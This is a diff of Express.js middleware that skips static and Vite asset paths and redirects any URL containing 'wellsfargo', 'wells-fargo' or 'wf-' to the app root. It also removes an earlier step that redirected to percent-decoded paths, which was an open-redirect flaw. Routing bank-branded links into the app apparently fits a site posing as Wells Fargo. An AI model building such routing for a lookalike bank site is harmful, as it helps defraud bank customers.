@@ -38,24 +38,19 @@ app.use((req, res, next) => {
 
 // Redirect any URL variations to main app (handles rebranded/edited links)
 app.use((req, res, next) => {
-  // Normalize paths - redirect common variations to root
   const path = req.path.toLowerCase();
   
-  // Handle common link editing patterns
-  if (path.includes('wellsfargo') || path.includes('wells-fargo') || path.includes('wf-')) {
-    return res.redirect('/');
+  // Skip static assets and Vite-related paths
+  if (path.startsWith('/src') || path.startsWith('/node_modules') || path.startsWith('/@') || 
+      path.includes('.js') || path.includes('.ts') || path.includes('.css') || 
+      path.includes('.png') || path.includes('.ico') || path.includes('.svg') ||
+      path.startsWith('/api') || path.startsWith('/assets')) {
+    return next();
   }
   
-  // Handle encoded URLs
-  if (path.includes('%') && !path.startsWith('/api')) {
-    try {
-      const decoded = decodeURIComponent(path);
-      if (decoded !== path && !decoded.startsWith('/api')) {
-        return res.redirect(decoded);
-      }
-    } catch (e) {
-      // Invalid encoding, continue
-    }
+  // Handle common link editing patterns - redirect to root
+  if (path.includes('wellsfargo') || path.includes('wells-fargo') || path.includes('wf-')) {
+    return res.redirect('/');
   }
   
   next();
